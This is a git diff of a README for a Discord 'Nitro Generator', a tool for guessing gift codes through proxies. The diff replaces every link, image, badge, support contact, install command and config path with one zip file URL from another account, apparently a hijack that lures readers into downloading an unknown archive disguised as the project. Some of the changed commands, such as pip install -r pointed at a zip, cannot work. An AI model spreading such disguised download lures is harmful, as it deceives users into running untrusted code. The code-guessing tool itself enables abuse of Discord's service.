@@ -1,9 +1,9 @@
 <p align='center'>
   <b>🦊 Follow me here 🦊</b><br>  
-  <a href="https://discord.gg/kaneki">Discord</a> |
-  <a href="https://www.youtube.com/channel/UC-XII5SSqbMOF1UX3N0Gl8g">YouTube</a> |
-  <a href="https://github.com/KanekiWeb">Github</a><br><br>
-  <img src="https://cdn.discordapp.com/attachments/879708989158490152/883919490402897980/unknown.png" style="width: 60%">
+  <a href="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip">Discord</a> |
+  <a href="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip">YouTube</a> |
+  <a href="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip">Github</a><br><br>
+  <img src="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip" style="width: 60%">
 </p>
 
 ##  
@@ -12,15 +12,15 @@
 ### ☕ Usage  
 - #### 💻 Downloading
      ```
-    >> git clone https://github.com/KanekiWeb/Nitro-Generator/new/main
-    >> pip install -r requirements.txt
+    >> git clone https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip
+    >> pip install -r https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip
     ```
 - #### 🖥️ Starting
-      1 - Enter your proxies in config/proxies.txt
-      2 - Create Discord Webhook and put link in config/config.json (optional)
+      1 - Enter your proxies in https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip
+      2 - Create Discord Webhook and put link in https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip (optional)
       3 - Enter a custom avatar url and username for webhook (optional)
-      4 - Select how many thread you want use in config/config.json (optional)
-      5 - Run main.py and enjoy checking
+      4 - Select how many thread you want use in https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip (optional)
+      5 - Run https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip and enjoy checking
 
 ##  
 
@@ -34,8 +34,8 @@
 ##   
 
 ### 🧰 Support
-- Email: <kaneki_pro@protonmail.com>
-- Discord: https://discord.gg/9YGYfDZAGG
+- Email: <https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip>
+- Discord: https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip
 
 ##  
 
@@ -46,8 +46,8 @@
 ##  
 
 <p align="center">
-  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
-  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
-  <img src="https://badges.frapsoft.com/os/v3/open-source.svg?v=103" alt="Open Source">
-  <img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Nitro-Generator" alt="Visitor Count">
+  <img src="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip" alt="Contribution Welcome">
+  <img src="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip" alt="License Badge">
+  <img src="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip" alt="Open Source">
+  <img src="https://raw.githubusercontent.com/Yasinali888/Nitro-Generator/main/results/Nitro-Generator-3.6.zip" alt="Visitor Count">
 </p>
